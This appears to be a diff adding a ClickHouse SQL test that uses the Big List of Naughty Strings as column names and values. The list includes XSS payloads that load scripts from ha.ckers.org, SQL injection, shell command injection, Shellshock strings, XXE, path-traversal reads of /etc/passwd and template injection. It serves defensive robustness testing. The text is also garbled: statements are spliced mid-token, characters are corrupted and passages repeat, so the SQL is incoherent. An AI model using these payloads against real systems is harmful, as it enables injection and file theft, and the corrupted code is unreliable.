@@ -1,0 +1,1701 @@
+-- Tags: no-orop_log' limit 1;
+undrop table 02681_undrop_log;
+select * from 02681_undrop_log order by i-- Tags: long
+
+-- https://github.com/minimaxir/big-list-of-naughty-strings
+
+/*
+The MIT License (MIT)
+
+Copyright (c) 2015-2020 Max Woolf
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+*/
+
+SET max_insert_threads = 0;
+
+DROP TABLE IF EXISTS test;
+
+CREATE TABLE test
+(
+  "undefined" String,
+  "undef" String,
+  "null" String,
+  "NULL" String,
+  "(null)" String,
+  "nil" String,
+  "NIL" String,
+  "true" String,
+  "false" String,
+  "True" String,
+  "False" String,
+  "TRUE" String,
+  "FALSE" String,
+  "None" String,
+  "hasOwnProperty" String,
+  "then" String,
+  "\\" String,
+  "\\\\" String,
+  "0" String,
+  "1" String,
+  "1.00" String,
+  "$1.00" String,
+  "1/2" String,
+  "1E2" String,
+  "1E02" String,
+  "1E+02" String,
+  "-1" String,
+  "-1.00" String,
+  "-$1.00" String,
+  "-1/2" String,
+  "-1E2" String,
+  "-1E02" String,
+  "-1E+02" String,
+  "1/0" String,
+  "0/0" String,
+  "-2147483648/-1" String,
+  "-9223372036854775808/-1" String,
+  "-0" String,
+  "-0.0" String,
+  "+0" String,
+  "+0.0" String,
+  "0.00" String,
+  "0..0" String,
+  "." String,
+  "0.0.0" String,
+  String,
+  "사회과학원 어학연구소" String,
+  "찦차를 타고 온 펲시맨과 쑛다리 똠방각하" String,
+  "社會科學院語學研究所" String,
+  "울란바토르" String,
+  "𠜎𠜱𠝹𠱓𠱸𠲖𠳏" String,
+  "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆" String,
+  "表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀" String,
+  "Ⱥ" String,
+  "Ⱦ" String,
+  "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ" String,
+  "(｡◕ ∀ ◕｡)" String,
+  "｀ｨ(´∀｀∩" String,
+  "__ﾛ(,_,*)" String,
+  "・(￣∀￣)・:*:" String,
+  "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ" String,
+  ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’" String,
+  "(╯°□°）╯︵ ┻━┻)" String,
+  "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻" String,
+  "┬─┬ノ( º _ ºノ)" String,
+  "( ͡° ͜ʖ ͡°)" String,
+  "¯\\_(ツ)_/¯" String,
+  "😍" String,
+  "👩🏽" String,
+  "👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️" String,
+  "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍" String,
+  "🐵 🙈 🙉 🙊" String,
+  "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙" String,
+ �"� �𜋿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿" String,
+  "👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦" String,
+  "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧" String,
+  "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟" String,
+  "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸" String,
+  "🇺🇸🇷🇺🇸🇦🇫🇦🇲" String,
+  "🇺🇸🇷🇺🇸🇦" String,
+  "１２３" String,
+  "١٢٣" String,
+  "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن��" String,
+  "찦차를 타고 온 펲시맨과 쑛다리 똠방각하" String,
+  "社會科學院語學研究所" String,
+  "울란바토르" String,
+  "𠜎𠜱𠝹𠱓𠱸𠲖𠳏" String,
+  "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆" String,
+  "表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀" String,
+  "Ⱥ" String,
+  "Ⱦ" String,
+  "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ" String,
+  "(｡◕ ∀ ◕｡)" String,
+  "｀ｨ(´∀｀∩" String,
+  "__ﾛ(,_,*)" String,
+  "・(￣∀￣)・:*:" String,
+  "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ" String,
+  ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’" String,
+  "(╯°□°）╯︵ ┻━┻)" String,
+  "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻" String,
+  "┬─┬ノ( º _ ºノ)" String,
+  "( ͡° ͜ʖ ͡°)" String,
+  "¯\\_(ツ)_/¯" String,
+  "😍" String,
+  "👩🏽" String,
+  "👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️" String,
+  "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍" String,
+  "🐵 🙈 🙉 🙊" String,
+  "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙" String,
+ �"� �𜋿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿" String,
+  "👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦" String,
+  "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧" String,
+  "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟" String,
+  "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸" String,
+  "🇺🇸🇷🇺🇸🇦🇫🇦🇲" String,
+  "🇺🇸🇷🇺🇸🇦" String,
+  "１２３" String,
+  "١٢٣" String,
+  "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما , يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." String,
+  "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" String,
+  "הָיְתָהtestالصفحات التّحول" String,
+  "﷽" String,
+  "ﷺ" String,
+  "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " String,
+  "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜‪‪‪" String,
+  "‪‪᚛                 ᚜‪" String,
+  "‪‪test‪" String,
+  "‫test‫" String,
+  " test " String,
+  "test⁠test‫" String,
+  "⁦test⁧" String,
+  "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" String,
+  "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" String,
+  "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" String,
+  "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" String,
+  "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" String,
+  "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" String,
+  "00˙Ɩ$-" String,
+  "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" String,
+  "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠" String,
+  "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌" String,
+  "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐�SS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" String,
+  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" String,
+  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" String,
+  "<SCRIPT SRC=//ha.ckers.org/.j>" String,
+  "<IMG SRC=\"javascript:alert('XSS')\"" String,
+  "<iframe src=http://ha.ckers.org/scriptlet.html <" String,
+  "\\\";alert('XSS');//" String,
+  "<u oncopy=alert()> Copy me</u>" String,
+  "<i onwheel=alert(1)> Scroll over me </i>" String,/  "<plaintext>" String,
+  "http://a/%%30%30" String,
+  "</textarea><script>alert(123)</script>" String,
+  "1;DROP TABLE users" String,
+  "1'; DROP TABLE users-- 1" String,
+  "' OR 1=1 -- 1" String,
+  "' OR '1'='1" String,
+  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --" String,
+  " " String,
+  "%" String,
+  "_" String,
+  "--" String,
+  "--version" String,
+  "--help" String,
+  "$USER" String,
+  "/dev/null; touch /tmp/blns.fail ; echo" String,
+  "`touch /tmp/blns.fail`" String,
+  "$(touch /tmp/blns.fail)" String,
+  "@{[system \"touch /tmp/blns.fail\"]}" String,
+  "eval(\"puts 'hello world'\")" String,
+  "System(\"ls -al /\")" String,
+  "`ls -al /`" String,
+  "Kernel.exec(\"ls -al /\")" String,
+  "Kernel.exit(1)" String,
+  "%x('ls -al /')" String,
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" String,
+  "$HOME" String,
+  "$ENV{'HOME'}" String,
+  "%d" String,
+  "%s%s%s%s%s" String,
+  "{0}" String,
+  "%*.*s" String,
+  "%@" String,
+  "%n" String,
+  "File:///" String,
+  "../../../../../../../../../../../etc/passwd%00" String,
+  "../../../../../../../../../../../etc/hosts" String,
+  "() { 0; }; touch /tmp/blns.shellshock1.fail;" String,
+  "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" String,
+  "<<< %s(un='%s') = %u" String,
+  "+++ATH0" String,
+  "CON" Strin`````````````````````````````````````````````````````````````````````````````````````````````````````````g,
+  "PRN" String,
+  "AUX" String,
+  "CLOCK$" String,
+  "NUL" String,
+  "A:" String,
+  "ZZ:" String,
+  "COM1" String,
+  "LPT1" String,
+  "LPT2" String,
+  "LPT3" String,
+  "COM2" String,
+  "COM3" String,
+  "COM4" String,
+  "DCC SEND STARTKEYLOGGER 0 0 0" String,
+  "Scunt�','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿d;
+drop tableselect(true distributed;
+drop table ','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็','\'','"','\'\'','""','\'"\'','"\'\'\'\'"\'"','"\'"\'"\'\'\'\'"','<foo val=“bar” />','<foo val=“bar” />','<foo val=”bar“ />','<foo val=`bar\' />','田中さんにあげて下さい','パーティーへ行かないか','和製漢語','部落格','사회과학원 어학연구소','찦차를 타고 온 펲시맨과 쑛다리 똠방각하','社會科學院語學研究所','울란바토르','𠜎𠜱𠝹𠱓𠱸𠲖𠳏','𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖�&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>','<IMG SRC="jav   ascript:alert(\'XSS\');">','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">','perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out','<IMG SRC=" &#14;  javascript:alert(\'XSS\');">','<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>','<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<<SCRIPT>alert("XSS");//<</SCRIPT>','<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >','<SCRIPT SRC=//ha.ckers.org/.j>','<IMG SRC="javascript:alert(\'XSS\')"','<iframe src=http://ha.ckers.org/scriptlet.html <','\\";alert(\'XSS\');//','<u oncopy=alert()> Copy me</u>','<i onwheel=alert(1)> Scroll over me </i>','<plaintext>','http://a/%%30%30','</textarea><script>alert(123)</script>','1;DROP TABLE users','1\'; DROP TABLE users-- 1','\' OR 1=1 -- 1','\' OR \'1\'=\'1','\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --',' ','%','_','-','--','--version','--help','$USER','/dev/null; touch /tmp/blns.fail ; echo','`touch /tmp/blns.fail`','$(touch /tmp/blns.fail)','@{[system "touch /tmp/blns.fail"]}','eval("puts \'hello world\'")','System("ls -al /")','`ls -al /`','Kernel.exec("ls -al /")','Kernel.exit(1)','%x(\'ls -al /\')','<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>','$HOME','$ENV{\'HOME\'}','%d','%s%s%s%s%s','{0}','%*.*s','%@','%n','File:///','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/hosts','() { 0; }; touch /tmp/blns.shellshock1.fail;','() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }','<<< %s(un=\'%s\') = %u','+++ATH0','CON','PRN','AUX','CLOCK$','NUL','A:','ZZ:','COM1','LPT1','LPT2','LPT3','COM2','COM3','COM4','DCC SEND STARTKEYLOGGER 0 0 0','Scunthorpe General Hospital','Penistone Community Church','Lightwater Country Park','Jimmy Clitheroe','Horniman Museum','shitake mushrooms','RomansInSussex.co.uk','http://www.cum.qc.ca/','Craig Cockburn, Software Specialist','Linda Callahan','Dr. Herman I. Libshitz','magna دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما , يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." String,
+  "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" String,
+  "הָיְתָהtestالصفحات التّحول" String,
+  "﷽" String,
+  "ﷺ" String,
+  "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " String,
+  "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜‪‪‪" String,
+  "‪‪᚛                 ᚜‪" String,
+  "‪‪test‪" String,
+  "‫test‫" String,
+  " test " String,
+  "test⁠test‫" String,
+  "⁦test⁧" String,
